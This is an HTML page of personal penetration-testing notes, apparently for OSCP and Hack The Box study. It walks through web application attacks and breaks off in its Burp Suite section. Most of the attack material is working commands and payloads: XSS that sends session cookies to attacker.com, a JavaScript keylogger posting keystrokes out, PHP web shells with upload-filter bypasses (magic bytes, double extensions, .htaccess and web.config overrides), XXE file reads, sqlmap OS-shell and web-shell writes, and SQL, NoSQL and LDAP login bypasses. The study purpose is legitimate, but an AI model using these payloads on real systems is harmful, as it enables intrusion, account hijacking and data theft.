<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Penetration Testing - Web Application Testing Guide - Alex Susanu</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Georgia', serif;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
            box-shadow: 0 0 30px rgba(0,0,0,0.1);
        }
        
        .header {
            background: linear-gradient(135deg, #4a90e2, #357abd);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .back-nav {
            background: #f8f9ff;
            padding: 15px 30px;
            border-bottom: 2px solid #e8f0ff;
        }
        
        .back-btn {
            background: #4a90e2;
            color: white;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 5px;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        .back-btn:hover {
            background: #357abd;
        }
        
        .content {
            padding: 40px 30px;
        }
        
        .note-meta {
            color: #666;
            font-style: italic;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #e8f0ff;
        }
        
        .note-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 30px;
        }
        
        .tag {
            background: #e8f0ff;
            color: #4a90e2;
            padding: 6px 12px;
            border-radius: 15px;
            font-size: 0.9em;
            font-weight: bold;
        }
        
        .note-content h2 {
            color: #4a90e2;
            margin-top: 30px;
            margin-bottom: 15px;
            border-bottom: 2px solid #e8f0ff;
            padding-bottom: 8px;
        }
        
        .note-content h3 {
            color: #4a90e2;
            margin-top: 25px;
            margin-bottom: 12px;
        }
        
        .note-content h4 {
            color: #333;
            margin-top: 20px;
            margin-bottom: 10px;
        }
        
        .note-content p {
            margin-bottom: 15px;
            text-align: justify;
        }
        
        .note-content ul {
            margin: 15px 0;
            padding-left: 25px;
        }
        
        .note-content li {
            margin-bottom: 8px;
        }
        
        .note-content pre {
            background: #f8f9ff;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            margin: 20px 0;
            border-left: 4px solid #4a90e2;
        }
        
        .note-content code {
            background: #f8f9ff;
            padding: 3px 6px;
            border-radius: 4px;
            font-size: 0.9em;
        }
        
        .note-content pre code {
            background: none;
            padding: 0;
        }
        
        .footer {
            background: #f8f9ff;
            padding: 20px 30px;
            text-align: center;
            color: #666;
            border-top: 2px solid #e8f0ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Penetration Testing - Web Application Testing Guide</h1>
        </div>
        
        <div class="back-nav">
            <a href="../index.html" class="back-btn">← Back to Knowledge Base</a>
        </div>
        
        <div class="content">
            <div class="note-meta">
                General (pentesting) • Updated May 29, 2025
            </div>
            
            <div class="note-tags">
                
            </div>
            
            <div class="note-content">
                <h2>Penetration Testing - Web Application Testing Guide</h2>
<strong>Category:</strong> Penetration Testing - Phase 2  
<strong>Tags:</strong> oscp, htb, web-application, sql-injection, xss, burpsuite, owasp, file-upload
<h3>Web Application Testing Methodology</h3>
<strong>What this phase covers:</strong> Systematic testing of web applications for vulnerabilities including injection flaws, broken authentication, security misconfigurations, and business logic errors following OWASP methodology.
<strong>Why web application testing is critical:</strong> 90% of modern applications are web-based. Web vulnerabilities are the most common attack vector in penetration tests. OWASP Top 10 vulnerabilities appear in 80% of web applications tested.
<strong>HTB/OSCP Web Testing Approach:</strong> Manual testing combined with automated tools. Focus on input validation, authentication bypasses, file uploads, and privilege escalation through web interfaces.
<h3>Web Application Reconnaissance</h3>
<h4><strong>HTTP Service Discovery and Analysis</strong></h4>
<strong>What this involves:</strong> Understanding web application architecture, technology stack, functionality, and attack surface before testing specific vulnerabilities.
<strong>Why application mapping is essential:</strong> You can't attack what you don't understand. Proper mapping reveals hidden functionality, admin interfaces, API endpoints, and technology-specific attack vectors.
<pre><code><h2>Technology stack identification</h2>
whatweb http://target.com                    # Identify web technologies, frameworks, versions
whatweb -v http://target.com                 # Verbose output with detailed analysis
whatweb --color=never http://target.com      # Plain text output for scripting
<h2>Why whatweb is important:</h2>
<h2>- Identifies CMS versions (WordPress, Drupal, Joomla)</h2>
<h2>- Reveals web frameworks (PHP, ASP.NET, Node.js)</h2>
<h2>- Shows web server versions and modules</h2>
<h2>- Helps select appropriate attack techniques</h2>
<h2>HTTP headers analysis</h2>
curl -I http://target.com                    # Get HTTP headers only
curl -v http://target.com                    # Verbose output with request/response headers
curl -X OPTIONS http://target.com            # Check allowed HTTP methods
<h2>Why header analysis matters:</h2>
<h2>- Server information reveals versions and technologies</h2>
<h2>- Security headers indicate security posture</h2>
<h2>- Allowed methods may include dangerous ones (PUT, DELETE)</h2>
<h2>- Custom headers may reveal internal information</h2>
<h2>Advanced header analysis</h2>
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com  # Test for header-based bypasses
curl -H "X-Real-IP: 127.0.0.1" http://target.com        # Alternative IP header bypass
curl -H "Host: localhost" http://target.com              # Host header injection test
<h2>Robots.txt and sitemap analysis</h2>
curl http://target.com/robots.txt            # Discover disallowed directories
curl http://target.com/sitemap.xml           # Discover site structure
curl http://target.com/sitemap_index.xml     # Alternative sitemap format
<h2>Why these files are valuable:</h2>
<h2>- robots.txt reveals directories admins want hidden</h2>
<h2>- Sitemaps show complete site structure</h2>
<h2>- May reveal admin panels, backup directories, API endpoints</h2></code></pre>
<h4><strong>Directory and File Discovery</strong></h4>
<p>#### <strong>gobuster</strong> - Advanced Web Content Discovery</p>
<strong>Deep dive into gobuster capabilities beyond basic directory scanning:</strong>
<pre><code><h2>Comprehensive directory enumeration with multiple extensions</h2>
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,xml,bak,old,zip,tar,gz,sql,log,conf,config,ini,inc
<h2>Why multiple extensions are crucial:</h2>
<h2>- .php/.asp/.jsp: Server-side scripts with potential vulnerabilities</h2>
<h2>- .bak/.old: Backup files often contain source code or credentials</h2>
<h2>- .xml/.conf/.ini: Configuration files with sensitive information</h2>
<h2>- .sql: Database dumps with credentials and data</h2>
<h2>- .log: Log files with internal information</h2>
<h2>- .inc: Include files that may be directly accessible</h2>
<h2>Status code analysis and filtering</h2>
gobuster dir -u http://target.com -w wordlist.txt -s 200,204,301,302,307,401,403 -b 404,400,500
<h2>Include: 200 (OK), 204 (No Content), 3xx (Redirects), 401 (Unauthorized), 403 (Forbidden)</h2>
<h2>Exclude: 404 (Not Found), 400 (Bad Request), 500 (Server Error)</h2>
<h2>Why status code filtering is important:</h2>
<h2>- 401/403 indicate protected resources that might be bypassable</h2>
<h2>- Redirects often point to login pages or restricted areas</h2>
<h2>- 200 with small response sizes might be default pages</h2>
<h2>- 204 responses might indicate API endpoints</h2>
<h2>Authentication and session handling</h2>
gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=abc123; auth_token=xyz789"
gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Basic dXNlcjpwYXNz"
gobuster dir -u http://target.com -w wordlist.txt -H "X-API-Key: secret123"
<h2>Custom User-Agent and headers for evasion</h2>
gobuster dir -u http://target.com -w wordlist.txt -a "Mozilla/5.0 GoogleBot/1.0"
gobuster dir -u http://target.com -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1"
<h2>API endpoint discovery</h2>
gobuster dir -u http://target.com/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt -x json,xml
<h2>Why API discovery is critical:</h2>
<h2>- APIs often have different authentication mechanisms</h2>
<h2>- May expose sensitive data or functionality</h2>
<h2>- Often less protected than main web interface</h2>
<h2>- Can provide direct database access</h2>
<h2>Virtual host and subdomain discovery</h2>
gobuster vhost -u target.com -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt --append-domain
gobuster vhost -u target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
<h2>Advanced filtering and output analysis</h2>
gobuster dir -u http://target.com -w wordlist.txt -l -k -t 50 --wildcard
<h2>-l: Show response length (helps identify interesting responses)</h2>
<h2>-k: Skip SSL verification</h2>
<h2>-t 50: 50 concurrent threads</h2>
<h2>--wildcard: Continue even if wildcard responses detected</h2>
<h2>Pattern-based discovery</h2>
gobuster dir -u http://target.com -w wordlist.txt -p pattern.txt
<h2>pattern.txt contains: {GOBUSTER}/v1, {GOBUSTER}/v2, {GOBUSTER}/api</h2>
<h2>Discovers versioned APIs and structured endpoints</h2></code></pre>
<p>#### <strong>ffuf</strong> - Advanced Web Fuzzing Techniques</p>
<strong>ffuf provides more flexibility than gobuster for complex fuzzing scenarios:</strong>
<pre><code><h2>Multi-position fuzzing for complex scenarios</h2>
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZDIR -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZFILE -u http://target.com/FUZZDIR/FUZZFILE.php
<h2>Fuzzes both directory and filename simultaneously</h2>
<h2>Discovers nested structures and file relationships</h2>
<h2>Parameter fuzzing for hidden functionality</h2>
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://target.com/search.php?FUZZ=test -fs 1234
<h2>Discovers hidden GET parameters</h2>
<h2>-fs filters out responses of specific size (error pages)</h2>
<h2>POST parameter discovery</h2>
ffuf -w params.txt -X POST -d "FUZZ=test&known_param=value" -u http://target.com/login.php -H "Content-Type: application/x-www-form-urlencoded"
<h2>Tests for additional POST parameters</h2>
<h2>May discover debug parameters or hidden functionality</h2>
<h2>JSON parameter fuzzing</h2>
ffuf -w params.txt -X POST -d '{"FUZZ":"test","known":"value"}' -u http://target.com/api/login -H "Content-Type: application/json"
<h2>Fuzzes JSON API parameters</h2>
<h2>Modern applications often use JSON APIs</h2>
<h2>Header fuzzing for access control bypasses</h2>
ffuf -w /usr/share/seclists/Fuzzing/http-request-headers.txt -H "FUZZ: test" -u http://target.com/admin -fc 403,404
<h2>Tests various HTTP headers for access control bypasses</h2>
<h2>May discover X-Forwarded-For, X-Real-IP, X-Originating-IP bypasses</h2>
<h2>Advanced filtering and matching</h2>
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301,302,401,403 -ms 100-10000 -ml 10-1000
<h2>-mc: Match HTTP status codes</h2>
<h2>-ms: Match response size range</h2>
<h2>-ml: Match response line count range</h2>
<h2>Recursive fuzzing</h2>
ffuf -w wordlist.txt -u http://target.com/FUZZ -recursion -recursion-depth 2 -e .php,.html,.txt
<h2>Automatically fuzzes discovered directories</h2>
<h2>Limited recursion depth to prevent infinite loops</h2>
<h2>Rate limiting and timing</h2>
ffuf -w wordlist.txt -u http://target.com/FUZZ -rate 100 -delay 1s
<h2>Limits request rate to avoid detection</h2>
<h2>Adds delay between requests</h2>
<h2>Custom wordlist generation on-the-fly</h2>
seq -w 0000 9999 | ffuf -w - -u http://target.com/file_FUZZ.txt
<h2>Generates numeric sequences for ID-based fuzzing</h2>
<h2>Useful for document IDs, user IDs, etc.</h2></code></pre>
<h3>SQL Injection Testing</h3>
<h4><strong>sqlmap</strong> - Automated SQL Injection Detection and Exploitation</h4>
<strong>What sqlmap does:</strong> Comprehensive SQL injection testing tool that detects, exploits, and extracts data from SQL injection vulnerabilities across multiple database platforms.
<strong>Why sqlmap is essential:</strong> SQL injection is still one of the most critical web vulnerabilities. sqlmap automates complex injection techniques that would take hours to perform manually.
<strong>When to use sqlmap:</strong> After discovering web forms, URL parameters, or API endpoints that interact with databases. Essential for database extraction in HTB/OSCP scenarios.
<pre><code><h2>Basic SQL injection testing</h2>
sqlmap -u "http://target.com/page.php?id=1"
<h2>Tests single GET parameter for SQL injection</h2>
<h2>Automatic detection of injection types and database</h2>
<h2>POST request testing</h2>
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
<h2>Tests POST parameters for SQL injection</h2>
<h2>Common in login forms and search functionality</h2>
<h2>Cookie-based injection testing</h2>
sqlmap -u "http://target.com/profile.php" --cookie="session_id=abc123; user_id=1"
<h2>Tests cookie values for SQL injection</h2>
<h2>Often overlooked attack vector</h2>
<h2>HTTP header injection testing</h2>
sqlmap -u "http://target.com/" --headers="X-Forwarded-For: 1" --level=3
<h2>Tests HTTP headers for injection</h2>
<h2>Requires higher level for header testing</h2>
<h2>Advanced detection techniques</h2>
sqlmap -u "http://target.com/search.php?q=test" --level=5 --risk=3
<h2>Maximum detection level and risk</h2>
<h2>Tests more injection points and techniques</h2>
<h2>Higher risk of causing application disruption</h2>
<h2>Database enumeration after successful injection</h2>
sqlmap -u "http://target.com/page.php?id=1" --dbs
<h2>Lists all databases available</h2>
<h2>First step in data extraction</h2>
<p>sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
<h2>Lists tables in specific database</h2>
<h2>Identifies data structure</h2></p>
<p>sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns
<h2>Lists columns in specific table</h2>
<h2>Understands table structure before extraction</h2></p>
<p>sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
<h2>Extracts specific columns from table</h2>
<h2>Focused data extraction</h2></p>
<h2>Advanced exploitation techniques</h2>
sqlmap -u "http://target.com/page.php?id=1" --os-shell
<h2>Attempts to get operating system shell</h2>
<h2>Uses database functions to execute system commands</h2>
<p>sqlmap -u "http://target.com/page.php?id=1" --sql-shell
<h2>Interactive SQL shell</h2>
<h2>Execute arbitrary SQL commands</h2></p>
<p>sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
<h2>Read files from the server filesystem</h2>
<h2>Common target files: /etc/passwd, config files</h2></p>
<p>sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
<h2>Write files to server filesystem</h2>
<h2>Upload web shells for persistent access</h2></p>
<h2>Authentication and session handling</h2>
sqlmap -u "http://target.com/page.php?id=1" --auth-type=basic --auth-cred="user:pass"
<h2>HTTP Basic authentication</h2>
<h2>Maintains authentication during testing</h2>
<p>sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"
<h2>Session cookie handling</h2>
<h2>Maintains session state during testing</h2></p>
<h2>Proxy and traffic routing</h2>
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
<h2>Route traffic through proxy (Burp Suite)</h2>
<h2>Allows manual analysis of requests</h2>
<h2>Custom injection testing</h2>
sqlmap -u "http://target.com/page.php?id=1" --tamper="space2comment,randomcase"
<h2>Use tamper scripts for WAF evasion</h2>
<h2>space2comment: Replace spaces with comments</h2>
<h2>randomcase: Randomize keyword case</h2>
<h2>Time-based blind injection optimization</h2>
sqlmap -u "http://target.com/page.php?id=1" --technique=T --time-sec=2
<h2>Focus on time-based techniques</h2>
<h2>Adjust timing for network conditions</h2>
<h2>Batch processing and automation</h2>
sqlmap -u "http://target.com/page.php?id=1" --batch --answers="crack=N,dict=N"
<h2>Non-interactive mode for automation</h2>
<h2>Predefined answers to common questions</h2></code></pre>
<h4><strong>Manual SQL Injection Testing</strong></h4>
<strong>Why manual testing is important:</strong> Automated tools may miss context-specific injections, custom applications, or complex scenarios. Manual testing provides deeper understanding and coverage.
<pre><code><h2>Basic manual injection testing with curl</h2>
curl "http://target.com/page.php?id=1'"
<h2>Test for error-based injection</h2>
<h2>Look for database error messages</h2>
<p>curl "http://target.com/page.php?id=1 AND 1=1"
curl "http://target.com/page.php?id=1 AND 1=2"
<h2>Boolean-based blind injection testing</h2>
<h2>Compare responses for true/false conditions</h2></p>
<h2>Time-based blind injection testing</h2>
curl "http://target.com/page.php?id=1; WAITFOR DELAY '00:00:05'--"  # SQL Server
curl "http://target.com/page.php?id=1 AND SLEEP(5)--"              # MySQL
curl "http://target.com/page.php?id=1 AND pg_sleep(5)--"           # PostgreSQL
<h2>Union-based injection testing</h2>
curl "http://target.com/page.php?id=1 UNION SELECT NULL,NULL,NULL--"
<h2>Determine number of columns</h2>
<h2>Match column count for successful union</h2>
<p>curl "http://target.com/page.php?id=1 UNION SELECT 1,database(),version()--"
<h2>Extract database information</h2>
<h2>Common information gathering queries</h2></p>
<h2>POST-based manual injection</h2>
curl -X POST -d "username=admin' OR 1=1--&password=test" http://target.com/login.php
<h2>Login bypass attempt</h2>
<h2>Common authentication bypass technique</h2>
<h2>JSON injection testing</h2>
curl -X POST -H "Content-Type: application/json" -d '{"id":"1\" OR \"1\"=\"1"}' http://target.com/api/user
<h2>JSON-based SQL injection</h2>
<h2>Modern applications often use JSON APIs</h2></code></pre>
<h3>Cross-Site Scripting (XSS) Testing</h3>
<h4><strong>XSS Detection and Exploitation</strong></h4>
<strong>What XSS vulnerabilities are:</strong> Input validation flaws that allow injection of malicious JavaScript into web pages viewed by other users.
<strong>Why XSS is critical:</strong> Leads to session hijacking, credential theft, defacement, and can be chained with other vulnerabilities for full compromise.
<strong>HTB/OSCP XSS scenarios:</strong> Often used for initial foothold, stealing admin cookies, or bypassing authentication mechanisms.
<pre><code><h2>Basic XSS testing payloads</h2>
curl "http://target.com/search.php?q=<script>alert('XSS')</script>"
<h2>Basic reflected XSS test</h2>
<h2>Look for script execution in response</h2>
<p>curl "http://target.com/search.php?q=<img src=x onerror=alert('XSS')>"
<h2>Alternative XSS payload using img tag</h2>
<h2>Bypasses basic script tag filtering</h2></p>
<h2>Advanced XSS payloads for filter evasion</h2>
curl "http://target.com/search.php?q=<svg onload=alert('XSS')>"
<h2>SVG-based XSS payload</h2>
<h2>Often bypasses blacklist filters</h2>
<p>curl "http://target.com/search.php?q=javascript:alert('XSS')"
<h2>JavaScript protocol handler</h2>
<h2>Works in href attributes and form actions</h2></p>
<h2>POST-based XSS testing</h2>
curl -X POST -d "comment=<script>alert('XSS')</script>" http://target.com/comment.php
<h2>Stored XSS in form submissions</h2>
<h2>Persists and affects multiple users</h2>
<h2>Cookie stealing XSS payload</h2>
curl "http://target.com/search.php?q=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
<h2>Steals session cookies</h2>
<h2>Allows session hijacking</h2>
<h2>DOM-based XSS testing</h2>
curl "http://target.com/page.php#<script>alert('XSS')</script>"
<h2>Fragment-based XSS</h2>
<h2>Executed by client-side JavaScript</h2>
<h2>XSS in HTTP headers</h2>
curl -H "User-Agent: <script>alert('XSS')</script>" http://target.com/
curl -H "Referer: <script>alert('XSS')</script>" http://target.com/
<h2>Header-based XSS</h2>
<h2>Displayed in logs or admin panels</h2></code></pre>
<h4><strong>XSS Payload Generation and Customization</strong></h4>
<pre><code><h2>Generate custom XSS payloads for specific scenarios</h2>
echo "document.location='http://$(hostname -I | awk '{print $1}'):8080/steal.php?cookie='+document.cookie" | base64
<h2>Base64 encoded cookie stealing payload</h2>
<h2>Evades basic detection</h2>
<h2>BeEF integration payload</h2>
echo "<script src='http://$(hostname -I | awk '{print $1}'):3000/hook.js'></script>"
<h2>Browser Exploitation Framework integration</h2>
<h2>Provides persistent browser control</h2>
<h2>Keylogger XSS payload</h2>
cat > keylogger.js << 'EOF'
document.addEventListener('keydown', function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/log.php', true);
    xhr.send('key=' + e.key);
});
EOF
<h2>JavaScript keylogger</h2>
<h2>Captures user keystrokes</h2></code></pre>
<h3>File Upload Vulnerabilities</h3>
<h4><strong>File Upload Testing Methodology</strong></h4>
<strong>What file upload vulnerabilities are:</strong> Flaws in file upload functionality that allow uploading malicious files, leading to code execution, directory traversal, or denial of service.
<strong>Why file uploads are critical:</strong> Direct path to remote code execution. Common in HTB/OSCP scenarios for initial compromise.
<pre><code><h2>Basic file upload testing</h2>
<h2>Create test files with different extensions</h2>
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
echo "<?php system(\$_GET['cmd']); ?>" > shell.php5
echo "<?php system(\$_GET['cmd']); ?>" > shell.phtml
echo "<?php system(\$_GET['cmd']); ?>" > shell.inc
<h2>Test various file extensions</h2>
curl -X POST -F "file=@shell.php" http://target.com/upload.php
curl -X POST -F "file=@shell.php5" http://target.com/upload.php
curl -X POST -F "file=@shell.phtml" http://target.com/upload.php
<h2>MIME type bypass testing</h2>
curl -X POST -F "file=@shell.php;type=image/jpeg" http://target.com/upload.php
<h2>Spoofs MIME type to bypass client-side filtering</h2>
<h2>Many applications only check MIME type</h2>
<h2>File signature bypass (magic bytes)</h2>
printf "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell_with_jpeg_header.php
curl -X POST -F "file=@shell_with_jpeg_header.php" http://target.com/upload.php
<h2>Adds JPEG magic bytes to PHP shell</h2>
<h2>Bypasses file signature validation</h2>
<h2>Double extension bypass</h2>
echo "<?php system(\$_GET['cmd']); ?>" > shell.php.jpg
curl -X POST -F "file=@shell.php.jpg" http://target.com/upload.php
<h2>Some applications strip last extension</h2>
<h2>Results in shell.php being executed</h2>
<h2>Null byte injection (older PHP versions)</h2>
echo "<?php system(\$_GET['cmd']); ?>" > "shell.php%00.jpg"
curl -X POST -F "file=@shell.php%00.jpg" http://target.com/upload.php
<h2>Null byte truncates filename parsing</h2>
<h2>Works on vulnerable PHP versions</h2>
<h2>Path traversal in filename</h2>
curl -X POST -F "file=@shell.php" -F "filename=../../../var/www/html/shell.php" http://target.com/upload.php
<h2>Attempts to write file outside intended directory</h2>
<h2>May allow writing to web root</h2>
<h2>Large file upload (DoS testing)</h2>
dd if=/dev/zero of=large_file.txt bs=1M count=1000
curl -X POST -F "file=@large_file.txt" http://target.com/upload.php
<h2>Tests for file size limitations</h2>
<h2>May cause denial of service</h2>
<h2>Polyglot file creation (valid image + PHP code)</h2>
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg -o polyglot.jpg
<h2>Embeds PHP code in image metadata</h2>
<h2>Executes if processed by PHP</h2></code></pre>
<h4><strong>Advanced File Upload Bypass Techniques</strong></h4>
<pre><code><h2>.htaccess upload for Apache servers</h2>
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
EOF
curl -X POST -F "file=@.htaccess" http://target.com/upload.php
<h2>Makes Apache treat images as PHP files</h2>
<h2>Allows execution of image-based shells</h2>
<h2>Web.config upload for IIS servers</h2>
cat > web.config << 'EOF'
<configuration>
    <system.webServer>
        <handlers>
            <add name="php-jpg" path="<em>.jpg" verb="</em>" modules="FastCgiModule" scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
EOF
curl -X POST -F "file=@web.config" http://target.com/upload.php
<h2>IIS equivalent of .htaccess</h2>
<h2>Configures server to execute images as PHP</h2>
<h2>ZIP file upload with path traversal</h2>
zip malicious.zip ../../../var/www/html/shell.php
curl -X POST -F "file=@malicious.zip" http://target.com/upload.php
<h2>Path traversal via ZIP extraction</h2>
<h2>May extract files to arbitrary locations</h2>
<h2>XML External Entity (XXE) via file upload</h2>
cat > malicious.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
EOF
curl -X POST -F "file=@malicious.xml" http://target.com/upload.php
<h2>XXE attack via XML file upload</h2>
<h2>May reveal server files</h2></code></pre>
<h3>Authentication and Session Management Testing</h3>
<h4><strong>Authentication Bypass Techniques</strong></h4>
<strong>What authentication flaws involve:</strong> Weaknesses in login mechanisms, session management, password policies, and access controls.
<strong>Why authentication testing is crucial:</strong> Authentication bypasses provide direct access to protected functionality. Common in web applications with custom authentication.
<pre><code><h2>SQL injection authentication bypass</h2>
curl -X POST -d "username=admin' OR '1'='1'--&password=anything" http://target.com/login.php
<h2>Classic SQL injection login bypass</h2>
<h2>Bypasses password verification</h2>
<h2>NoSQL injection authentication bypass</h2>
curl -X POST -H "Content-Type: application/json" -d '{"username":{"$ne":""},"password":{"$ne":""}}' http://target.com/api/login
<h2>NoSQL (MongoDB) injection bypass</h2>
<h2>Modern applications using NoSQL databases</h2>
<h2>LDAP injection authentication bypass  </h2>
curl -X POST -d "username=admin)(&(password=*&password=anything" http://target.com/login.php
<h2>LDAP injection in Active Directory environments</h2>
<h2>Bypasses LDAP authentication</h2>
<h2>HTTP parameter pollution</h2>
curl -X POST -d "username=guest&username=admin&password=test" http://target.com/login.php
<h2>Different parameters with same name</h2>
<h2>May cause authentication bypass</h2>
<h2>Session fixation testing</h2>
curl -c cookies.txt -b cookies.txt http://target.com/login.php
<h2>Captures session ID before authentication</h2>
<h2>Tests if session ID changes after login</h2>
<h2>Weak session token analysis</h2>
for i in {1..10}; do
    curl -c "cookies_$i.txt" http://target.com/login.php
    grep -o 'PHPSESSID=[^;]*' "cookies_$i.txt"
done
<h2>Analyzes multiple session tokens</h2>
<h2>Looks for predictable patterns</h2>
<h2>Password reset token analysis</h2>
curl -X POST -d "email=admin@target.com" http://target.com/reset_password.php
<h2>Requests password reset</h2>
<h2>Analyze reset tokens for predictability</h2>
<h2>Multi-factor authentication bypass</h2>
curl -X POST -d "username=admin&password=correct&otp=" http://target.com/login.php
<h2>Empty OTP field testing</h2>
<h2>May bypass MFA validation</h2>
<h2>Race condition in authentication</h2>
for i in {1..50}; do
    curl -X POST -d "username=admin&password=wrong" http://target.com/login.php &
done
wait
<h2>Concurrent login attempts</h2>
<h2>May bypass rate limiting</h2></code></pre>
<h4><strong>Session Management Testing</strong></h4>
<pre><code><h2>Session timeout testing</h2>
curl -b "session=valid_session_id" http://target.com/profile.php
sleep 3600  # Wait 1 hour
curl -b "session=valid_session_id" http://target.com/profile.php
<h2>Tests session timeout implementation</h2>
<h2>Long-lived sessions are security risks</h2>
<h2>Session token entropy analysis</h2>
python3 -c "
import requests
import re
tokens = []
for i in range(100):
    r = requests.get('http://target.com/login.php')
    token = re.search(r'PHPSESSID=([^;]+)', r.headers.get('Set-Cookie', ''))
    if token:
        tokens.append(token.group(1))
print(f'Unique tokens: {len(set(tokens))}/{len(tokens)}')
"
<h2>Analyzes session token uniqueness</h2>
<h2>Predictable tokens allow session hijacking</h2>
<h2>Cross-site request forgery (CSRF) testing</h2>
curl -X POST -d "email=attacker@evil.com" -H "Referer: http://evil.com" http://target.com/change_email.php
<h2>Tests CSRF protection</h2>
<h2>Missing CSRF tokens allow cross-site attacks</h2>
<h2>Session hijacking via XSS</h2>
curl "http://target.com/search.php?q=<script>new Image().src='http://attacker.com/cookie.php?c='+document.cookie</script>"
<h2>Combines XSS with session hijacking</h2>
<h2>Steals session cookies via JavaScript</h2></code></pre>
<h3>Business Logic Vulnerabilities</h3>
<h4><strong>Application-Specific Logic Flaws</strong></h4>
<strong>What business logic flaws are:</strong> Vulnerabilities in application-specific functionality that don't fit traditional vulnerability categories but allow unauthorized actions.
<strong>Why business logic testing is important:</strong> These flaws are often missed by automated scanners but can provide significant access to application functionality.
<pre><code><h2>Price manipulation testing (e-commerce)</h2>
curl -X POST -d "item_id=123&price=-10.00&quantity=1" http://target.com/purchase.php
<h2>Negative price testing</h2>
<h2>May result in credit to attacker's account</h2>
<p>curl -X POST -d "item_id=123&price=0.01&quantity=1" http://target.com/purchase.php
<h2>Price modification testing</h2>
<h2>Tests if client-side prices are trusted</h2></p>
<h2>Quantity manipulation</h2>
curl -X POST -d "item_id=123&quantity=-5" http://target.com/cart.php
<h2>Negative quantity testing</h2>
<h2>May cause unexpected behavior</h2>
<h2>User enumeration via response timing</h2>
time curl -X POST -d "username=existing_user&password=wrong" http://target.com/login.php
time curl -X POST -d "username=nonexistent_user&password=wrong" http://target.com/login.php
<h2>Compares response times</h2>
<h2>Different timing may indicate user existence</h2>
<h2>Privilege escalation via parameter manipulation</h2>
curl -b "session=user_session" http://target.com/profile.php?user_id=1
curl -b "session=user_session" http://target.com/profile.php?user_id=2
<h2>Tests horizontal privilege escalation</h2>
<h2>Access to other users' data</h2>
<p>curl -b "session=user_session" -X POST -d "role=admin" http://target.com/update_profile.php
<h2>Tests vertical privilege escalation</h2>
<h2>Attempts to elevate privileges</h2></p>
<h2>Workflow bypass testing</h2>
curl -X POST -d "step=3" http://target.com/checkout.php
<h2>Skips intermediate steps</h2>
<h2>May bypass validation or payment</h2>
<h2>Rate limiting bypass</h2>
curl -H "X-Forwarded-For: 192.168.1.1" -X POST -d "username=admin&password=wrong" http://target.com/login.php
curl -H "X-Forwarded-For: 192.168.1.2" -X POST -d "username=admin&password=wrong" http://target.com/login.php
<h2>IP spoofing to bypass rate limits</h2>
<h2>Uses different source IPs</h2></code></pre>
<h3>Burp Suite Integration and Manual Testing</h3>
<h4><strong>Burp Suite Professional Features for HTB/OSCP</strong></h4>
<strong>What Burp Suite provides:</strong> Comprehensive web application security testing platform with proxy, scanner, intruder, and various specialized tools.
<strong>Why Burp Suite is essential:</strong> Industry standard for manual web application testing. Provides detailed control over HTTP requests and automated testing capabilities.
<pre><code><h2>Setting up Burp Suite proxy</h2>
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080
<h2>Configure applications to use Burp proxy</h2>
curl --proxy http://127.0.0.1:8080 http://target.com
firefox --profile /path/to/profile &  # With proxy configured
<h2>Burp Intruder attack types and use cases:</h2>
<h2>1. Sniper: Single payload position</h2>
<h2>   - Parameter fuzzing, directory brute force</h2>
<h2>2. Battering Ram: Same payload in all positions</h2>
<h2>   - Username = password attacks</h2>
<h2>3. Pitchfork: Different payload for each position</h2>
<h2>   - Username:password pair testing</h2>
<h2>4. Cluster Bomb: All combinations of payloads</h2>
<h2>   - Comprehensive parameter testing</h2>
<h2>Burp Collaborator for out-of-band testing</h2>
<h2>Use Burp Collaborator URLs in payloads to detect:</h2>
<h2>- Blind SQL injection with DNS queries</h2>
